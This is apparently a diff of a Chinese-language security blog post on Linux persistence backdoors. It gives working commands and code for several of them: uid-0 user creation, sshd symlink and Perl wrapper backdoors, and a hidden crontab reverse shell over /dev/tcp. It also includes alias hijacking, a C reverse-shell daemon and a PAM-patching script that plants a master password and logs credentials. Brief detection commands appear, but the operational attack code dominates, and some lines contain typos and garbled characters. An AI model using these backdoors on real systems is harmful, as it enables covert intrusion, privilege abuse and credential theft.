+useradd guest<span class="p">;</span><span class="nb">echo</span> -e <span class="s2">&#34;123456\n123456\n&#34;</span> <span class="p">|</span>passwd guest
+</code></pre></td></tr></table>
+</div>
+</div><p>添加root用户：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 创建一个用户名为guest，密码为123456的root用户</span>
+useradd -p <span class="sb">`</span>openssl passwd -1 -salt <span class="s1">&#39;salt&#39;</span> 123456<span class="sb">`</span> guest -o -u <span class="m">0</span> -g root -G root -s /bin/bash -d /home/guest
+</code></pre></td></tr></table>
+</div>
+</div><p>排查方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 查询特权用户（uid = 0）</span>
+awk -F: <span class="s1">&#39;$3==0{print $1}&#39;</span> /etec/passwd
+<span class="c1"># 查询可以远程登录的帐号信息</span>
+awk <span class="s1">&#39;/\$1|\$6/{print $1}&#39;</span> /etc/shadow
+<span class="c1"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span>
+more /etc/sudoers <span class="p">|</span> grep -v <span class="s2">&#34;^#\|^</span>$<span class="s2">&#34;</span> <span class="p">|</span> grep <span class="s2">&#34;ALL=(ALL)&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="2-增加超级用户">2. 增加超级用户</h3>
+<p>在完成用户添加后，可以对添加的用户赋予超级用户权限。</p>
+<p>目标主机执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an❌0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
+</code></pre></td></tr></table>
+</div>
+</div><p>如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an:👎-1👎-1👎-1:500&#34;</span> &gt;&gt; /etc/shadow
+</code></pre></td></tr></table>
+</div>
+</div><p>有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。</p>
+<h3 id="1-ssh后门">1. SSH后门</h3>
+<h4 id="1-sshd-软连接">1. sshd 软连接</h4>
+<p>目标主机建立软连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ln -sf /usr/sbin/sshd /tmp/su<span class="p">;</span> /tmp/su -oPort<span class="o">=</span>5555<span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>攻击机直接ssh登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh root@x.x.x.x -p <span class="m">5555</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里端口可以任意，但是<code>/tmp/su</code>部分有限制。可以使用任意密码进行登录，在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为<code>sufficient</code>时只要<code>pam_rootok</code>模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: <code>/etc/pam.d/su</code>)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。具体原理详见<a href="http://www.91ri.org/16803.html" target="_blank" rel="noopener noreffer">Linux的一个后门引发对PAM的探究</a>。</p>
+<p>缺点：易被排查，通过进程、端口可以轻松看到异常，使用<code>kill -s 9 PID</code>即可清除后门。</p>
+<h4 id="2-ssh免密后门文件落地">2. ssh免密后门(文件落地)</h4>
+<p>在攻击机上生成一对公私钥，然后将公钥上传到目标主机，路径为<code>~/.ssh/authorized_keys</code>，攻击机本地保存私钥。通过ssh登录，ssh程序会发送私钥到目标主机与公钥进行匹配，匹配通过即可实现ssh登录。</p>
+<p>生成公钥和私钥：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa
+</code></pre></td></tr></table>
+</div>
+</div><p>进入<code>/root/.ssh</code>，将公钥<code>id_rsa.pub</code>的内容复制到目标主机（是否上传替换文件取决于具体情况），在<code>/root/.ssh/authorized_keys</code>中追加<code>id_rsa.pub</code>中的内容，配置完成。(有些系统没有keys文件，可以自行创建一个。)</p>
+<p>缺点：易被排查，检查<code>/root/.ssh/authorized_keys</code>是否被修改，清理不受信的公钥即可清除后门。</p>
+<h4 id="3-ssh-wrapper文件落地">3. ssh wrapper（文件落地）</h4>
+<p>目标主机上执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /usr/sbin/
+mv sshd ../bin/
+<span class="nb">echo</span> <span class="s1">&#39;#!/usr/bin/perl&#39;</span> &gt;sshd
+<span class="nb">echo</span> <span class="s1">&#39;exec &#34;/bin/sh&#34; if(getpeername(STDIN) =~ /^..4A/);&#39;</span> &gt;&gt;sshd
+<span class="nb">echo</span> <span class="s1">&#39;exec{&#34;/usr/bin/sshd&#34;} &#34;/usr/sbin/sshd&#34;,@ARGV,&#39;</span> &gt;&gt;sshd
+chmod u+x sshd
+/etc/init.d/sshd restart
+</code></pre></td></tr></table>
+</div>
+</div><p>完成后执行<code>cat sshd</code>进行验证，输出如下则说明配置成功：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/perl
+</span><span class="cp"></span><span class="nb">exec</span> <span class="s2">&#34;/bin/sh&#34;</span> <span class="k">if</span><span class="o">(</span>getpeername<span class="o">(</span>STDIN<span class="o">)</span> <span class="o">=</span>~ /^..4A/<span class="o">)</span><span class="p">;</span>
+exec<span class="o">{</span><span class="s2">&#34;/usr/bin/sshd&#34;</span><span class="o">}</span> <span class="s2">&#34;/usr/sbin/sshd&#34;</span>,@ARGV,
+</code></pre></td></tr></table>
+</div>
+</div><p>攻击机上执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat STDIO TCP4:x.x.x.x:22,sourceport<span class="o">=</span><span class="m">13377</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里的sourceport可以进行修改，但是需要使用python的struct标准库实现。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,19256<span class="o">)</span>
+&gt;&gt;&gt; print repr<span class="o">(</span>buffer<span class="o">)</span>
+<span class="s1">&#39;\x00\x00LF&#39;</span>
+&gt;&gt;&gt; <span class="nv">buffer</span> <span class="o">=</span> struct.pack<span class="o">(</span><span class="s1">&#39;&gt;I6&#39;</span>,13377<span class="o">)</span>
+&gt;&gt;&gt; print buffer
+4A
+</code></pre></td></tr></table>
+</div>
+</div><p>原理简单说明：<code>init</code>首先启动的是<code>/usr/sbin/sshd</code>,脚本执行到<code>getpeername</code>这里的时候，正则匹配会失败，于是执行下一句，启动<code>/usr/bin/sshd</code>，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的<code>/usr/sbin/sshd</code>，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，<code>getpeername</code>能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。</p>
+<p>排查方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ls -al /usr/sbin/sshd
+cat /usr/sbin/sshd
+</code></pre></td></tr></table>
+</div>
+</div><p>如果想彻底恢复的话，需要进行ssh服务的重装。</p>
+<h4 id="4-ssh的隐身登录">4. ssh的隐身登录</h4>
+<p>在进行ssh登录时可以使用以下命令实现隐身登录，避免被<code>last\who\w</code>等指令检测到。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 不被last\who\w等指令检测</span>
+ssh -T username@x.x.x.x /bin/bash -i
+
+<span class="c1"># 不记录ssh公钥在本地.ssh目录中</span>
+ssh -o <span class="nv">UserKnownHostFile</span><span class="o">=</span>/dev/null -T user@x.x.x.x /bin/bash -if
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="3-suid-shell">3. SUID Shell</h3>
+<p>需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cp /bin/bash /dev/.rootshell
+chmod u+s /dev/.rootshell
+</code></pre></td></tr></table>
+</div>
+</div><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。</p>
+<h3 id="4-crontab后门文件落地">4. crontab后门（文件落地）</h3>
+<p><code>crontab</code>命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。</p>
+<p>Step 1 ：创建shell脚本，例如在/etc/evil.sh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.160.154/12345  0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>并给脚本赋予相应权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">chmod +sx /etc/evil.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>Step 2：设置定时服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">crontab -e
+</code></pre></td></tr></table>
+</div>
+</div><p>输入以下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># exec per min</span>
+
+*/1 * * * * root /etc/evil.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>重启crond服务，<code>service crond restart</code>，然后使用nc接收shell。</p>
+<p>上述方法在实际测试中成功了率较低，建议使用一句话后门：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span>crontab -l<span class="p">;</span><span class="nb">printf</span> <span class="s2">&#34;*/1 * * * * /tmp/crontab_backdoor.sh;\rno crontab for `whoami`%100c\n&#34;</span><span class="o">)</span><span class="p">|</span>crontab -
+</code></pre></td></tr></table>
+</div>
+</div><p>这种方式成功率更高，而且不易被<code>crontab -l</code>发现。</p>
+<p>其中关于crondtab的详细原理可以参考：<a href="https://cloud.tencent.com/developer/article/1683265">https://cloud.tencent.com/developer/article/1683265</a></p>
+<p>排查手段：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 查看可以的定时任务列表</span>
+crontab -e
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="5-alias欺骗文件落地">5. alias欺骗（文件落地）</h3>
+<p>可以通过<code>alias</code>命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例：</p>
+<ol>
+<li>
+<p>修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">ssh</span><span class="o">=</span><span class="s1">&#39;strace -o /tmp/sshpwd-`date    &#39;</span>+%d%h%m%s<span class="s1">&#39;`.log -e read,write,connect  -s2048 ssh&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>利用守护进程回弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">alias</span> <span class="nv">cat</span><span class="o">=</span><span class="s1">&#39;cat&amp;&amp;/root/.shell&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<p>回弹shell的c语言版脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// shell.c
+</span><span class="c1"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define ERR_EXIT(m) 
+</span><span class="cp"></span><span class="k">do</span>
+<span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">while</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">time_t</span> <span class="n">t</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="n">creat_daemon</span><span class="p">();</span>
+    <span class="c1">// 将ip和端口进行替换
+</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="s">&#34;bash -i &gt;&amp; /dev/tcp/192.168.80.147/12345 0&gt;&amp;1&#34;</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">creat_daemon</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">devnullfd</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">fdtablesize</span><span class="p">;</span>
+    <span class="n">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;fork error&#34;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;SETSID ERROR&#34;</span><span class="p">);</span>
+    <span class="n">chdir</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">);</span>
+
+    <span class="cm">/* close any open file descriptors */</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">fdtablesize</span> <span class="o">=</span> <span class="n">getdtablesize</span><span class="p">();</span> <span class="n">fd</span> <span class="o">&lt;</span> <span class="n">fdtablesize</span><span class="p">;</span> <span class="n">fd</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">devnullfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="cm">/* make STDIN ,STDOUT and STDERR point to /dev/null */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">devnullfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t open /dev/null&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDIN_FILENO&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">devnullfd</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">ERR_EXIT</span><span class="p">(</span><span class="s">&#34;can&#39;t dup2 /dev/null to STDOUT_FILENO&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="n">SIG_IGN</span><span class="p">);</span> 
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>使用nc监听回弹的shell。</p>
+<h3 id="6-linux-pam密码记录后门文件落地">6. Linux PAM密码记录后门（文件落地）</h3>
+<p>PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下：</p>
+<ol>
+<li>获取目标系统所使用的PAM版本，下载对应版本的pam版本</li>
+<li>解压缩，修改pam_unix_auth.c文件，添加万能密码</li>
+<li>编译安装PAM</li>
+<li>编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</li>
+</ol>
+<p>一个自动化脚本如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="c1">## </span>
+<span class="c1">##查看版本:</span>
+<span class="c1">##redhat yum list pam</span>
+<span class="c1">##debian&amp;Ubuntu  dpkg -s libpam-modules | grep -i version | cut -d&#39; &#39; -f2</span>
+<span class="c1">##</span>
+<span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;test123&#39;</span> <span class="c1">##......</span>
+<span class="nv">LOG</span><span class="o">=</span><span class="s1">&#39;\/bin\/.sshlog&#39;</span> <span class="c1">##......</span>
+
+<span class="nb">echo</span> <span class="s2">&#34;
+</span><span class="s2">.___  ___.   ___     ___    _______  ____    ____ 
+</span><span class="s2">|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
+</span><span class="s2">|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
+</span><span class="s2">|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
+</span><span class="s2">|  |  |  | | |_| | | |_| | |  &#39;--&#39;  |    |  |     
+</span><span class="s2">|__|  |__|  \___/   \___/  |_______/     |__|   &#34;</span>
+<span class="nb">echo</span> -e <span class="s2">&#34;\nPam-Backdoor\n{code this shit while learning pam}\n\n&#34;</span>
+<span class="nv">oldtime</span><span class="o">=</span><span class="sb">`</span>stat -c <span class="s1">&#39;%z&#39;</span> /lib/security/pam_ftp.so<span class="sb">`</span>
+<span class="nb">echo</span> <span class="s1">&#39;Pam backdoor starting!&#39;</span>
+<span class="nv">mirror_url</span><span class="o">=</span><span class="s1">&#39;http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz&#39;</span>
+<span class="c1">#mirror_url=&#39;http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz&#39;，修改为对应的pam版本</span>
+<span class="nb">echo</span> <span class="s1">&#39;Fetching from &#39;</span><span class="nv">$mirror_url</span>
+wget <span class="nv">$mirror_url</span> <span class="c1">#fetch the roll</span>
+tar zxf Linux-PAM-1.1.1.tar.gz <span class="c1">#untar,修改为对应的pam版本</span>
+<span class="nb">cd</span> Linux-PAM-1.1.1
+<span class="c1">#find and replace</span>
+sed -i -e <span class="s1">&#39;s/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif (strcmp(p,&#34;&#39;</span><span class="nv">$PASS</span><span class="s1">&#39;&#34;)==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\n\tFILE * fp;\n\tfp = fopen(&#34;&#39;</span><span class="nv">$LOG</span><span class="s1">&#39;&#34;, &#34;a&#34;);\n\tfprintf(fp, &#34;%s : %s\\n&#34;, name, p);\n\tfclose(fp);\n\t}/g&#39;</span> modules/pam_unix/pam_unix_auth.c
+<span class="nv">DIS</span><span class="o">=</span><span class="sb">`</span>head /etc/issue -n 1<span class="p">|</span>awk <span class="s1">&#39;{print $1}&#39;</span><span class="sb">`</span>
+<span class="c1">#get the version</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$DIS</span> <span class="o">=</span> <span class="s2">&#34;CentOS&#34;</span> <span class="o">]</span><span class="p">;</span><span class="k">then</span>
+./configure --disable-selinux <span class="o">&amp;&amp;</span> make
+<span class="k">else</span>
+./configure <span class="o">&amp;&amp;</span> make
